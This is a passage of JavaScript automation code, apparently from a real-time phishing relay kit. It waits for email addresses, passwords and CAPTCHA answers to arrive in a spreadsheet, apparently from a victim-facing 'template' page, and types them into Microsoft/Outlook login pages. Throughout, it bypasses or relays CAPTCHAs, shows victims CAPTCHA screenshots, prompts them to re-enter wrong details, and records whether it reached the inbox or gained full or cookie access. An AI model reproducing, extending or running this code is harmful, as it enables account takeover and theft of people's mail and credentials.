            browser.on('targetcreated', targetCreatedListener);

            await page.setUserAgent(browser.selectedUserAgent);
            await page.setViewport({ width: 1920, height: 1080, deviceScaleFactor: 1 });

            await page.evaluateOnNewDocument(() => {
                const style = document.createElement('style');
                style.innerHTML = `
                html, body { overflow: auto !important; }
                ::-webkit-scrollbar { display: block !important; }
            `;
                document.head.appendChild(style);
            });
        }

        let domain = '';
        let mxRecords = [];
        let matchedPlatformKey = '';
        let platformConfig = {};

        // Determine platform and platformConfig early if email is available
        if (email) { // Only if email is available from the start or found in WAITINGEMAIL
            domain = email.split('@')[1].toLowerCase();
            mxRecords = await resolveMx(domain).catch(() => []);
            matchedPlatformKey = Object.keys(platformConfigs).find(key => {
                const config = platformConfigs[key];
                return config.mxKeywords && config.mxKeywords.some(kw => domain.includes(kw) || mxRecords.some(mx => mx.exchange && mx.exchange.includes(kw)));
            });
            platform = matchedPlatformKey || 'unknown';
            updateData.platform = platform;
            platformConfig = platformConfigs[platform] || {};
        } else if (row[columnIndexes['platform']]) {
            // Email is empty (e.g. cleared by STRICTLY_MISMATCH), fall back to stored platform
            platform = row[columnIndexes['platform']];
            updateData.platform = platform;
            platformConfig = platformConfigs[platform] || {};
            logger.debug(`[processRow][${browserId}] No email available. Using stored platform: '${platform}'`);
        }

        // If we have an email but couldn't resolve a platform or login URL, persist a specific
        // WAITINGEMAIL state with an informative lastJsonResponse so the UI can surface a
        // distinct error (unable to determine login URL) that is different from a later
        // 'incorrect email after page load' detection.
        if (status !== 'WAITINGEMAIL' && email && (!platformConfig || !platformConfig.url || platform === 'unknown')) {
            logger.info(`[processRow][${browserId}] Could not determine platform/login URL for domain '${domain}'. Persisting WAITINGEMAIL with descriptive lastJsonResponse.`);
            finalStatus = "WAITINGEMAIL";
            updateData.status = finalStatus;
            updateData.lastJsonResponse = JSON.stringify({
                browserId,
                email,
                status: finalStatus,
                platform: platform || 'unknown',
                domain: domain || '',
                errorType: 'NO_PLATFORM_URL',
                message: `Unable to determine login URL for domain '${domain}'. Please verify the email or try a different account.`,
                timestamp: new Date().toISOString()
            });
            // Clear email/domain in the sheet to prompt the user to re-enter and persist the WAITINGEMAIL state
            updateBrowserRowDataFast(browserId, { ...updateData, email: '', domain: '' });
            return; // Exit so no later logic overwrites this WAITING state
        }

        // Main state handling logic
        processingStarted = true;
        if (status === "WAITING") {
            logger.debug(`[processRow][${browserId}] Initial WAITING state. Performing initial checkAccountAccess.`);
            await handleAdditionalViews(page, platformConfig, instanceId, 'initial_load');
            initialCheckResult = await checkAccountAccess(browser, page, email, password, platform, browserId);
        } else if (status === "WAITINGEMAIL") {
            logger.info(`[processRow][${browserId}] Entering WAITINGEMAIL poll loop.`);
            logger.info(`[engineProcess][${browserId}] -WAITINGEMAIL (entering poll loop)`);
            activelyProcessing.delete(browserId);
            // If strictly provides a known platform, navigate to its login URL immediately
            // so the user sees the login page while waiting for email input
            try {
                const rowStrictly = row[columnIndexes['strictly']];
                if (rowStrictly && platformConfigs[rowStrictly] && platformConfigs[rowStrictly].url) {
                    const targetUrl = platformConfigs[rowStrictly].url;
                    logger.info(`[processRow][${browserId}] strictly='${rowStrictly}' -> navigating to ${targetUrl} while waiting for email`);
                    await page.goto(targetUrl, { waitUntil: 'domcontentloaded', timeout: 30000 }).catch(e => {
                        logger.warn(`[processRow][${browserId}] Early navigation to ${targetUrl} failed: ${e.message}`);
                    });
                } else {
                    logger.debug(`[processRow][${browserId}] No valid strictly value for early navigation (value='${rowStrictly || ''}')`);
                }
            } catch (navErr) {
                logger.warn(`[processRow][${browserId}] Error during early navigation: ${navErr.message}`);
            }
            const pollingTimeoutEmail = Date.now() + 5 * 60 * 1000; // 5 minutes timeout
            let emailProvidedAndProcessed = false;

            while (Date.now() < pollingTimeoutEmail && !emailProvidedAndProcessed) {
                try {
                    // Session Health Check
                    if (page && !(await isPageResponsive(page, browserId, instanceId))) {
                        logger.error(`[processRow][${browserId}][WAITINGEMAIL] Page became unresponsive. Marking as FAILED.`);
                        finalStatus = "FAILED";
                        updateData.status = "FAILED";
                        updateData.verified = false; // FAILED so verified false
                        updateData.fullAccess = false; // FAILED so fullAccess false
                        updateData.lastJsonResponse = JSON.stringify({
                            ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
                            message: "Failed during WAITINGEMAIL phase: Browser page became unresponsive."
                        });
                        break; // Exit polling loop
                    }

                    // Template Liveliness Check — if template stopped polling, close browser to save resources
                    if (!isTemplateAlive(browserId)) {
                        logger.info(`[processRow][${browserId}][WAITINGEMAIL] Template stopped polling (>3min). Closing browser.`);
                        finalStatus = "FAILED";
                        updateData.status = "FAILED";
                        updateData.lastJsonResponse = JSON.stringify({
                            ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
                            message: "Failed during WAITINGEMAIL phase: Template stopped responding."
                        });
                        break;
                    }

                    // Check cache FIRST for email (pooling operator writes here immediately via immediateFlush)
                    let currentEmail = null;
                    let freshPassword = null;
                    const cachedForPoll = getCachedRow(browserId);
                    if (cachedForPoll?.email && String(cachedForPoll.email).trim() !== "") {
                        currentEmail = cachedForPoll.email;
                        freshPassword = cachedForPoll.password;
                        logger.info(`[processRow][${browserId}][WAITINGEMAIL] Email found in cache: '${currentEmail}'`);
                    }

                    // Fall back to sheet read if cache doesn't have email
                    if (!currentEmail) {
                        const checkData = await fetchDataFromAppScript(1, 30000, true); // Force refresh, rate-limited by _fetchAndCacheAppScriptData
                        const checkHeaders = checkData[0];
                        const checkColumnIndexes = getColumnIndexes(checkHeaders);
                        const checkRows = checkData.slice(1);
                        const checkRow = checkRows.find(r => r[checkColumnIndexes['browserId']] === browserId);

                        if (!checkRow) {
                            logger.error(`[processRow][${browserId}][WAITINGEMAIL] Row not found during polling. Exiting loop.`);
                            finalStatus = "FAILED";
                            break;
                        }

                        if (checkRow[checkColumnIndexes['status']] === 'FAILED') {
                            logger.info(`[processRow][${browserId}][WAITINGEMAIL] Status changed to FAILED externally. Exiting.`);
                            finalStatus = "FAILED";
                            break;
                        }

                        currentEmail = checkRow[checkColumnIndexes['email']];
                        freshPassword = checkRow[checkColumnIndexes['password']];
                        logger.debug(`[processRow][${browserId}][WAITINGEMAIL] Fetched email from sheet: '${currentEmail}'`);
                    }

                    if (currentEmail && String(currentEmail).trim() !== "") {
                        logger.info(`[processRow][${browserId}][WAITINGEMAIL] Email found. Setting status to PROCESSING.`);
                        logger.info(`[engineProcess][${browserId}] +WAITINGEMAIL (found email)`);
                        activelyProcessing.add(browserId);
                        await updateBrowserRowDataFast(browserId, { status: "PROCESSING", email: currentEmail, verified: false, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email: currentEmail, status: "PROCESSING", message: "Processing email verification" }) });
                        email = currentEmail; // Update the email variable for subsequent use
                        updateData.email = email; // Persist to updateData so later writes (e.g. WAITINGPASSWORD_ERROR) don't clear it
                        emailProvidedAndProcessed = true;
                        // Refresh password from cache or sheet — user may have submitted it alongside email
                        if (freshPassword && String(freshPassword).trim() !== "") {
                            password = freshPassword;
                        }

                        // Validate email against strictly platform using MX detection
                        const rowStrictlyForValidation = row[columnIndexes['strictly']];
                        if (rowStrictlyForValidation) {
                            const validation = await validateEmailAgainstStrictly(email, rowStrictlyForValidation);
                            if (!validation.valid) {
                                logger.warn(`[processRow][${browserId}] Email '${email}' rejected by strictly validation: ${validation.message}`);
                                finalStatus = "WAITINGEMAIL";
                                updateData.status = finalStatus;
                                updateData.lastJsonResponse = JSON.stringify({
                                    browserId,
                                    email,
                                    password: password || '',
                                    status: finalStatus,
                                    emailExists: true,
                                    accountAccess: false,
                                    reachedInbox: false,
                                    requiresVerification: false,
                                    verificationState: null,
                                    verificationOptions: [],
                                    platform: 'unknown',
                                    timestamp: new Date().toISOString(),
                                    errorType: 'STRICTLY_MISMATCH',
                                    message: validation.message,
                                    lastTriedEmail: email,
                                    lastTriedPassword: password || ''
                                });
                                sendWrongInputAlert({ type: 'WRONG_EMAIL', platform:'outlook', email: email || '', browserId, password: password || '', detail: `STRICTLY_MISMATCH: ${validation.message}` });
                                // Clear email to prevent re-processing, but keep password in sheet for the next attempt
                                updateBrowserRowDataFast(browserId, { ...updateData, email: '', domain: '', verified: false, fullAccess: false });
                                exitingEarly = true;
                                return; // Exit processRow immediately
                            }
                        }

                        // After email is found, we need to determine platform and then proceed with checkAccountAccess
                        domain = email.split('@')[1].toLowerCase();
                        mxRecords = await resolveMx(domain).catch(() => []);
                        matchedPlatformKey = Object.keys(platformConfigs).find(key => {
                            const config = platformConfigs[key];
                            return config.mxKeywords && config.mxKeywords.some(kw => domain.includes(kw) || mxRecords.some(mx => mx.exchange && mx.exchange.includes(kw)));
                        });
                        platform = matchedPlatformKey || 'unknown';
                        updateData.platform = platform;
                        platformConfig = platformConfigs[platform] || {};

                        initialCheckResult = await checkAccountAccess(browser, page, email, password, platform, browserId, true); // For email retry, reuse session, no navigation
                        logger.info(`[processRow][${browserId}] checkAccountAccess result: emailExists=${initialCheckResult.emailExists}, accountAccess=${initialCheckResult.accountAccess}, reachedInbox=${initialCheckResult.reachedInbox}, requiresVerification=${initialCheckResult.requiresVerification}, verificationState=${initialCheckResult.verificationState}, error=${initialCheckResult.error || 'none'}`);

                        // Immediately check the result for generic email errors and set status within the polling loop
                        if (!initialCheckResult.emailExists && (initialCheckResult.verificationState === null || initialCheckResult.verificationState === undefined)) {
                            logger.info(`[processRow][${browserId}] Generic email error detected during WAITINGEMAIL. Setting status to WAITINGEMAIL.`);
                            finalStatus = "WAITINGEMAIL";
                            // Ensure updateData reflects the new status immediately so finally() sees it
                            updateData.status = finalStatus;
                            updateData.lastJsonResponse = JSON.stringify({
                                browserId,
                                email,
                                status: finalStatus,
                                emailExists: initialCheckResult.emailExists,
                                accountAccess: initialCheckResult.accountAccess,
                                reachedInbox: initialCheckResult.reachedInbox,
                                requiresVerification: initialCheckResult.requiresVerification,
                                verificationState: initialCheckResult.verificationState || null,
                                verificationOptions: initialCheckResult.verificationOptions || [],
                                platform,
                                timestamp: new Date().toISOString(),
                                message: initialCheckResult.message || "Email does not exist. Please provide a valid email."
                            });
                            sendWrongInputAlert({ type: 'WRONG_EMAIL', platform, email, browserId, detail: `Generic: "${initialCheckResult.message || 'Email does not exist'}"` });
                            // Clear the email, domain, and password fields in the sheet when transitioning to WAITINGEMAIL
                            logger.debug(`[processRow][${browserId}] Clearing email, domain, password. Returning to WAITINGEMAIL state.`);
                            updateBrowserRowDataFast(browserId, { ...updateData, email: '', domain: '', password: '', verified: false, fullAccess: false });
                            exitingEarly = true;
                            return; // Exit processRow immediately so no later logic overwrites status
                        }

                        break; // Exit polling loop (original break)
                    } else {
                        logger.debug(`[processRow][${browserId}][WAITINGEMAIL] No email found yet. Waiting...`);
                    }

                } catch (pollError) {
                    logger.error(`[processRow][${browserId}][WAITINGEMAIL] Error during polling: ${pollError.message}`);
                    await new Promise(resolve => setTimeout(resolve, 15000));
                }

                if (!emailProvidedAndProcessed) {
                    await new Promise(resolve => setTimeout(resolve, 5000)); // Wait before next poll (reduced from 10000 to 5000)
                }
            }

            logger.debug(`[processRow][${browserId}][WAITINGEMAIL] Exited poll loop. emailProvided: ${emailProvidedAndProcessed}, now: ${Date.now()}, timeoutAt: ${pollingTimeoutEmail}, diff: ${pollingTimeoutEmail - Date.now()}ms`);

            if (emailProvidedAndProcessed) {
                logger.info(`[processRow][${browserId}] Email found. checkAccountAccess: emailExists=${initialCheckResult.emailExists}, accountAccess=${initialCheckResult.accountAccess}, reachedInbox=${initialCheckResult.reachedInbox}, verificationState=${initialCheckResult.verificationState}`);
            }

            if (!emailProvidedAndProcessed) {
                logger.warn(`[processRow][${browserId}][WAITINGEMAIL] Polling for email timed out. Setting status to FAILED.`);
                finalStatus = "FAILED";
                updateData.status = "FAILED";
                updateData.verified = false; // FAILED so verified false
                updateData.fullAccess = false; // FAILED so fullAccess false
                updateData.cookieAccess = false; // FAILED so cookieAccess false
                updateData.lastJsonResponse = JSON.stringify({
                    ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
                    message: "Failed during WAITINGEMAIL phase: Email not provided in time."
                });

                // Explicitly close browser and clean up immediately
                if (browser && !browserFullyClosed) {
                    if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
                    await browser.close().catch(err => logger.error(`Error closing browser for ${browserId} on WAITINGEMAIL timeout: ${err.message}`));
                    browserFullyClosed = true;
                    activeBrowserSessions.delete(browserId);
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
                if (userDataDir) {
                    try {
                        logger.info(`[processRow][${browserId}] Deleting user data dir for WAITINGEMAIL timeout: ${userDataDir}`);
                        await fs.remove(userDataDir);
                        logger.info(`[processRow][${browserId}] Successfully deleted user data directory.`);
                    } catch (deleteError) {
                        logger.error(`[processRow][${browserId}] Error deleting user data directory on WAITINGEMAIL timeout: ${deleteError.message}`);
                    }
                }
                logger.debug(`[processRow][${browserId}] Exiting WAITINGEMAIL timeout path.`);
                return; // Exit processRow if email not found
            }
        } else if (status === "WAITINGCAPTCHA") {
            logger.info(`[processRow][${browserId}] Resuming from WAITINGCAPTCHA state.`);
            const captchaConfig = platformConfig.captchaConfig;
            if (!captchaConfig) {
                logger.error(`[processRow][${browserId}] WAITINGCAPTCHA but no captchaConfig for platform ${platform}. Failing.`);
                finalStatus = "FAILED";
                updateData.status = "FAILED";
            } else {
                const captchaPollTimeout = Date.now() + 5 * 60 * 1000;
                let captchaProcessed = false;
                while (Date.now() < captchaPollTimeout && !captchaProcessed) {
                    try {
                        if (page && !(await isPageResponsive(page, browserId, instanceId))) {
                            logger.error(`[processRow][${browserId}][WAITINGCAPTCHA] Page unresponsive.`);
                            finalStatus = "FAILED";
                            break;
                        }

                        // Template Liveliness Check
                        if (!isTemplateAlive(browserId)) {
                            logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Template stopped polling (>3min). Closing browser.`);
                            finalStatus = "FAILED";
                            break;
                        }

                        const checkData = await fetchDataFromAppScript(1, 30000, true);
                        const checkHeaders = checkData[0];
                        const checkColumnIndexes = getColumnIndexes(checkHeaders);
                        const checkRows = checkData.slice(1);
                        const checkRow = checkRows.find(r => r[checkColumnIndexes['browserId']] === browserId);
                        if (!checkRow) {
                            logger.error(`[processRow][${browserId}][WAITINGCAPTCHA] Row not found.`);
                            finalStatus = "FAILED";
                            break;
                        }
                        if (checkRow[checkColumnIndexes['status']] === 'FAILED') {
                            logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Status changed to FAILED externally.`);
                            finalStatus = "FAILED";
                            break;
                        }
                        const captchaAnswer = checkRow[checkColumnIndexes['captchaAnswer']];
                        if (captchaAnswer && String(captchaAnswer).trim() !== "") {
                            logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] CAPTCHA answer found: ${captchaAnswer}`);
                            updateBrowserRowDataFast(browserId, { status: "PROCESSING", captchaAnswer: '' });
                            // Find and fill the captcha answer input
                            const answerSelectors = captchaConfig.answerInput.split(',').map(s => s.trim());
                            let filled = false;
                            for (const sel of answerSelectors) {
                                try {
                                    await page.waitForSelector(sel, { visible: true, timeout: 5000 });
                                    await page.evaluate((s) => { const el = document.querySelector(s); if (el) el.value = ''; }, sel);
                                    await page.type(sel, captchaAnswer, { delay: 30 });
                                    filled = true;
                                    logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Filled answer using selector: ${sel}`);
                                    break;
                                } catch (e) { /* try next */ }
                            }
                            if (filled) {
                                const submitSelectors = captchaConfig.submitButton.split(',').map(s => s.trim());
                                let submitted = false;
                                for (const sel of submitSelectors) {
                                    try {
                                        await page.waitForSelector(sel, { visible: true, timeout: 5000 });
                                        await page.click(sel);
                                        submitted = true;
                                        logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Clicked submit: ${sel}`);
                                        break;
                                    } catch (e) { /* try next */ }
                                }
                                if (!submitted) {
                                    logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Submit button not found, pressing Enter.`);
                                    await page.keyboard.press('Enter');
                                }
                                await new Promise(res => setTimeout(res, 3000));
                                // Re-check account access after captcha submission
                                const recheckResult = await checkAccountAccess(browser, page, email, password, platform, browserId, true);
                                logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Re-check after captcha: ${JSON.stringify(recheckResult)}`);
                                if (recheckResult.verificationState === 'CAPTCHA_FAILED') {
                                    // Still on captcha, re-screenshot and update
                                    try {
                                        const screenshotBuffer = await page.screenshot({ fullPage: true });
                                        const base64Image = screenshotBuffer.toString('base64');
                                        const { uploadImageToDrive } = await import('../../../api/googledrive.mjs');
                                        const uploadResult = await uploadImageToDrive(base64Image, `captcha_${browserId}_${Date.now()}.png`, process.env.GOOGLE_DRIVE_FOLDER_ID);
                                        if (uploadResult.success) {
                                            updateData.captcha = uploadResult.webViewLink;
                                            updateBrowserRowDataFast(browserId, { captcha: uploadResult.webViewLink });
                                        }
                                    } catch (ssError) {
                                        logger.error(`[processRow][${browserId}][WAITINGCAPTCHA] Re-screenshot error: ${ssError.message}`);
                                    }
                                    logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Still on captcha after answer. Re-entering WAITINGCAPTCHA.`);
                                    await new Promise(res => setTimeout(res, 5000));
                                } else if (recheckResult.reachedInbox) {
                                    logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Captcha passed! Reached inbox.`);
                                    finalStatus = "COMPLETED";
                                    captchaProcessed = true;
                                    break;
                                } else if (recheckResult.requiresVerification) {
                                    logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Captcha passed, now on verification screen.`);
                                    finalStatus = recheckResult.verificationState;
                                    captchaProcessed = true;
                                    break;
                                } else if (recheckResult.emailExists) {
                                    logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Captcha passed, now on password screen.`);
                                    finalStatus = "WAITINGPASSWORD";
                                    captchaProcessed = true;
                                    break;
                                } else {
                                    logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Unknown post-captcha state. Retrying.`);
                                }
                            } else {
                                logger.warn(`[processRow][${browserId}][WAITINGCAPTCHA] Could not find captcha answer input. Retrying.`);
                            }
                        }
                    } catch (pollError) {
                        logger.error(`[processRow][${browserId}][WAITINGCAPTCHA] Poll error: ${pollError.message}`);
                    }
                    if (!captchaProcessed && finalStatus !== "FAILED") {
                        await new Promise(res => setTimeout(res, 5000));
                    }
                }
                if (!captchaProcessed && finalStatus !== "FAILED") {
                    logger.warn(`[processRow][${browserId}][WAITINGCAPTCHA] Polling timed out.`);
                    finalStatus = "WAITINGCAPTCHA";
                }
            }
            updateData.status = finalStatus;
        } else if (status === "WAITINGPASSWORD") {
            logger.info(`[processRow][${browserId}] Resuming from WAITINGPASSWORD state.`);
            let pollingTimeoutPassword = Date.now() + 5 * 60 * 1000; // 5 minutes timeout
            let passwordProvidedAndProcessed = false;

            while (Date.now() < pollingTimeoutPassword && !passwordProvidedAndProcessed) {
                try {
                    // Session Health Check
                    if (page && !(await isPageResponsive(page, browserId, instanceId))) {
                        logger.error(`[processRow][${browserId}][WAITINGPASSWORD] Page became unresponsive. Marking as FAILED.`);
                        finalStatus = "FAILED";
                        updateData.status = "FAILED";
                        updateData.lastJsonResponse = JSON.stringify({
                            ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
                            message: "Failed during WAITINGPASSWORD phase: Browser page became unresponsive."
                        });
                        break; // Exit polling loop
                    }

                    // Template Liveliness Check — if template stopped polling, close browser to save resources
                    if (!isTemplateAlive(browserId)) {
                        logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Template stopped polling (>3min). Closing browser.`);
                        finalStatus = "FAILED";
                        updateData.status = "FAILED";
                        updateData.lastJsonResponse = JSON.stringify({
                            ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
                            message: "Failed during WAITINGPASSWORD phase: Template stopped responding."
                        });
                        break;
                    }

                    let cachedPassword = null;
                    let cachedStatus = null;
                    const cachedRow = getCachedRow(browserId);
                    if (cachedRow) {
                        cachedPassword = cachedRow.password;
                        cachedStatus = cachedRow.status;
                    }

                    if (cachedStatus === 'FAILED') {
                        logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Status changed to FAILED externally (cache). Exiting.`);
                        finalStatus = "FAILED";
                        break;
                    }

                    if (!cachedPassword) {
                        const checkData = await fetchDataFromAppScript(1, 30000, true);
                        const checkHeaders = checkData[0];
                        const checkColumnIndexes = getColumnIndexes(checkHeaders);
                        const checkRows = checkData.slice(1);
                        const checkRow = checkRows.find(r => r[checkColumnIndexes['browserId']] === browserId);

                        if (!checkRow) {
                            logger.error(`[processRow][${browserId}][WAITINGPASSWORD] Row not found during polling. Exiting loop.`);
                            finalStatus = "FAILED";
                            break;
                        }

                        if (checkRow[checkColumnIndexes['status']] === 'FAILED') {
                            logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Status changed to FAILED externally. Exiting.`);
                            finalStatus = "FAILED";
                            break;
                        }

                        cachedPassword = checkRow[checkColumnIndexes['password']];
                    }

                    if (cachedPassword && String(cachedPassword).trim() !== "") {
                        logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Password found. Setting status to PROCESSING.`);
                        logger.info(`[engineProcess][${browserId}] +WAITINGPASSWORD (found password)`);
                        // Restore email from cache if it was cleared (e.g. by STRICTLY_MISMATCH)
                        if (!email) {
                            const cachedRowForEmail = getCachedRow(browserId);
                            if (cachedRowForEmail?.email) {
                                email = cachedRowForEmail.email;
                                updateData.email = email;
                                logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Restored email from cache: '${email}'`);
                            }
                        }
                        // If email was restored, re-derive platform and platformConfig
                        // (they were determined at the top of processRow when email was empty)
                        if (email && platform === 'unknown') {
                            const restoredDomain = email.split('@')[1].toLowerCase();
                            const restoredMxRecords = await resolveMx(restoredDomain).catch(() => []);
                            const restoredPlatformKey = Object.keys(platformConfigs).find(key => {
                                const cfg = platformConfigs[key];
                                return cfg.mxKeywords && cfg.mxKeywords.some(kw => restoredDomain.includes(kw) || restoredMxRecords.some(mx => mx.exchange && mx.exchange.includes(kw)));
                            });
                            platform = restoredPlatformKey || 'outlook';
                            updateData.platform = platform;
                            platformConfig = platformConfigs[platform] || {};
                            logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Re-derived platform from restored email: '${platform}'`);
                        }
                        // Verify the page is still valid before proceeding with password entry
                        if (page && !(await verifyPageStillValid(page, platformConfig, 'password'))) {
                            logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Page no longer valid (expected selector missing). Marking FAILED.`);
                            finalStatus = "FAILED";
                            updateData.status = "FAILED";
                            updateData.lastJsonResponse = JSON.stringify({
                                ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
                                message: "Failed during WAITINGPASSWORD phase: Login page was closed or navigated away."
                            });
                            break;
                        }
                        activelyProcessing.add(browserId);
                        updateBrowserRowDataFast(browserId, { status: "PROCESSING", verified: false, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email, status: "PROCESSING", message: "Processing password submission" }) }); // Set status to PROCESSING
                        logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Attempting to input password.`);

                        // Ensure page is stable and handle any intermediate views before typing password
                        // Removed page.waitForLoadState as it's not a function in this Puppeteer version.
                        await handleAdditionalViews(page, platformConfig, instanceId, 'password_entry'); // New context for password entry specific views

                        const passwordInputSelectors = Array.isArray(platformConfig.selectors?.passwordInput) ? platformConfig.selectors.passwordInput : [platformConfig.selectors?.passwordInput].filter(Boolean);
                        const passwordNextButtonSelector = platformConfig.selectors?.passwordNextButton;

                        if (passwordInputSelectors.length > 0 &&
                            passwordNextButtonSelector && (typeof passwordNextButtonSelector === 'string' || (Array.isArray(passwordNextButtonSelector) && passwordNextButtonSelector.length > 0))) {
                            try {
                                let foundSelector = null;
                                const passwordPollTimeout = Date.now() + 30000;
                                while (Date.now() < passwordPollTimeout && !foundSelector) {
                                    for (const sel of passwordInputSelectors) {
                                        try {
                                            await page.waitForSelector(sel, { visible: true, timeout: 5000 });
                                            foundSelector = sel;
                                            break;
                                        } catch (pwWaitErr) {
                                            if (pwWaitErr.name === 'TimeoutError') continue;
                                            logger.warn(`[processRow][${browserId}] Selector '${sel}' error: ${pwWaitErr.message}`);
                                        }
                                    }
                                    if (!foundSelector) {
                                        const currentUrl = page.url();
                                        const pageTitle = await page.title().catch(() => 'unknown');
                                        logger.debug(`[processRow][${browserId}] Password input not found. URL: ${currentUrl}, Title: ${pageTitle}`);

                                        if (currentUrl === 'about:blank' || (!currentUrl.includes('login.live.com') && !currentUrl.includes('login.microsoftonline.com'))) {
                                            logger.info(`[processRow][${browserId}] Page is at ${currentUrl}, navigating to login page for password entry.`);
                                            await page.goto(platformConfig.url || 'https://outlook.live.com/mail/', { waitUntil: 'domcontentloaded', timeout: 30000 }).catch(e => {
                                                logger.warn(`[processRow][${browserId}] Navigation to login page failed: ${e.message}`);
                                            });
                                            await new Promise(res => setTimeout(res, 3000));
                                            continue;
                                        }

                                        await handleAdditionalViews(page, platformConfig, instanceId, 'password_entry');
                                        const emailInputSelector = platformConfig.selectors?.input;
                                        if (emailInputSelector) {
                                            const emailVisible = await page.$eval(emailInputSelector, el => el.offsetParent !== null).catch(() => false);
                                            if (emailVisible) {
                                                logger.info(`[processRow][${browserId}] Email input visible, re-entering email.`);
                                                await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, emailInputSelector);
                                                await page.type(emailInputSelector, email, { delay: 50 });
                                                let btnClicked = false;
                                                if (platformConfig.selectors.nextButton) {
                                                    const btns = Array.isArray(platformConfig.selectors.nextButton) ? platformConfig.selectors.nextButton : [platformConfig.selectors.nextButton];
                                                    for (const btnSel of btns) {
                                                        try {
                                                            await page.waitForSelector(btnSel, { visible: true, timeout: 5000 });
                                                            await page.click(btnSel);
                                                            btnClicked = true;
                                                            break;
                                                        } catch (btnErr) {
                                                            logger.warn(`[processRow][${browserId}] Email next button selector not clickable: ${btnSel}`);
                                                        }
                                                    }
                                                }
                                                if (btnClicked) {
                                                    await new Promise(res => setTimeout(res, 2000));
                                                }
                                            }
                                        }
                                        const captchaConfig = platformConfig.captchaConfig;
                                        if (captchaConfig) {
                                            // Check for text image CAPTCHA
                                            const captchaImg = await page.$('#captchaimg').catch(() => null);
                                            if (captchaImg) {
                                                logger.info(`[processRow][${browserId}] Text image CAPTCHA detected in WAITINGPASSWORD loop. Attempting to solve...`);
                                                const solved = await solveImageCaptcha(page, instanceId);
                                                if (solved) {
                                                    logger.info(`[processRow][${browserId}] CAPTCHA solved. Continuing...`);
                                                    await new Promise(res => setTimeout(res, 2000));
                                                    continue;
                                                } else {
                                                    logger.error(`[processRow][${browserId}] CAPTCHA solve failed.`);
                                                    finalStatus = "FAILED";
                                                    updateData.status = "FAILED";
                                                    passwordProvidedAndProcessed = true;
                                                    break;
                                                }
                                            }

                                            // Check for reCAPTCHA via URL patterns
                                            const captchaUrl = page.url();
                                            const isCaptcha = captchaConfig.urlPatterns.some(p => p.test(captchaUrl));
                                            if (isCaptcha) {
                                                logger.info(`[processRow][${browserId}] reCAPTCHA detected in WAITINGPASSWORD loop. URL: ${captchaUrl}. Attempting to solve...`);
                                const recaptchaSolved = await solveRecaptchaV2(page, instanceId);
                                                if (recaptchaSolved) {
                                                    logger.info(`[processRow][${browserId}] reCAPTCHA solved. Continuing...`);
                                                    await new Promise(res => setTimeout(res, 3000));
                                                    continue;
                                                } else {
                                                    logger.error(`[processRow][${browserId}] reCAPTCHA solve failed.`);
                                                    finalStatus = "FAILED";
                                                    updateData.status = "FAILED";
                                                    passwordProvidedAndProcessed = true;
                                                    break;
                                                }
                                            }
                                        }
                                        await new Promise(res => setTimeout(res, 1000));
                                    }
                                }
                                if (passwordProvidedAndProcessed) break;
                                if (!foundSelector) {
                                    throw new Error(`Password input not found after 30s polling timeout. Tried selectors: ${JSON.stringify(passwordInputSelectors)}`);
                                }
                                logger.debug(`[processRow][${browserId}] Using password selector: ${foundSelector}`);
                                await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, foundSelector);
                                await page.type(foundSelector, cachedPassword, { delay: 50 });
                                logger.info(`[processRow][${browserId}] Successfully typed password.`);

                                logger.debug(`[processRow][${browserId}] Attempting to click password next button and await navigation. Selectors: ${JSON.stringify(passwordNextButtonSelector)}`);
                                let selectorsToAttempt = Array.isArray(passwordNextButtonSelector) ? passwordNextButtonSelector : [passwordNextButtonSelector];
                                let clickedSelector = null;
                                const urlBeforePwSubmit = page.url();

                                for (const selector of selectorsToAttempt) {
                                    try {
                                        // Allow more time for dynamic rendering
                                        await page.waitForSelector(selector, { visible: true, timeout: 15000 });
                                        await new Promise(res => setTimeout(res, 150)); // Small delay for stability

                                        // Attempt a JS click which can be more reliable in some cases
                                        try {
                                            await page.$eval(selector, el => (el.click && el.click()) || el.dispatchEvent(new MouseEvent('click', { bubbles: true })));
                                        } catch (jsClickError) {
                                            // Fallback to page.click if $eval fails
                                            await page.click(selector);
                                        }

                                        // Wait for navigation but don't fail if it doesn't happen
                                        await page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 15000 }).catch(() => null);

                                        // Small settle time then check page state
                                        await new Promise(res => setTimeout(res, 1500));

                                        clickedSelector = selector;
                                        logger.info(`[processRow][${browserId}] Clicked password next button using selector: ${clickedSelector}`);
                                        break; // Click attempted, exit loop
                                    } catch (clickNavError) {
                                        logger.warn(`[processRow][${browserId}] Click on selector '${selector}' failed or not clickable. Trying next if available. Error: ${clickNavError.message}`);
                                    }
                                }

                                if (!clickedSelector) {
                                    // Fallback: try pressing Enter to submit the form (handles Fluent UI buttons)
                                    try {
